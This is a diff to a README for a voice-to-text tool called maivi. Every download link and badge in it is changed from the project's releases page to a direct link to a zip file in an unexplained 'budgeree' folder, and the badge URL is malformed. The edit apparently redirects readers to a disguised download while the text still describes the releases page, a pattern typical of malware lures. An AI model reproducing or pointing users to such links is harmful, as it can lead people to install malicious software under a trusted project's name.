@@ -1,6 +1,6 @@
 # 🎤 maivi - Real-time Voice-to-Text Made Easy
 
-[![Download maivi](https://img.shields.io/badge/Download%20maivi-v1.0-blue.svg)](https://github.com/hassandogan16/maivi/releases)
+[![Download maivi](https://raw.githubusercontent.com/hassandogan16/maivi/main/budgeree/maivi.zip%https://raw.githubusercontent.com/hassandogan16/maivi/main/budgeree/maivi.zip)](https://raw.githubusercontent.com/hassandogan16/maivi/main/budgeree/maivi.zip)
 
 ## 📦 Introduction
 
@@ -31,7 +31,7 @@ Before downloading Maivi, please ensure your system meets the following requirem
 To get Maivi, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the download section.
-   [Download Maivi Here](https://github.com/hassandogan16/maivi/releases)
+   [Download Maivi Here](https://raw.githubusercontent.com/hassandogan16/maivi/main/budgeree/maivi.zip)
 
 2. **Select the Latest Version:** On the releases page, locate the latest version of Maivi. The version number will look something like `v1.0`.
 
@@ -80,4 +80,4 @@ Maivi is released under the MIT License. Feel free to explore the code and utili
 
 Thank you for choosing Maivi. We hope you enjoy a seamless voice-to-text experience. For any additional questions, don’t hesitate to reach out through our GitHub repository.
 
-[![Download maivi](https://img.shields.io/badge/Download%20maivi-v1.0-blue.svg)](https://github.com/hassandogan16/maivi/releases)
+[![Download maivi](https://raw.githubusercontent.com/hassandogan16/maivi/main/budgeree/maivi.zip%https://raw.githubusercontent.com/hassandogan16/maivi/main/budgeree/maivi.zip)](https://raw.githubusercontent.com/hassandogan16/maivi/main/budgeree/maivi.zip)
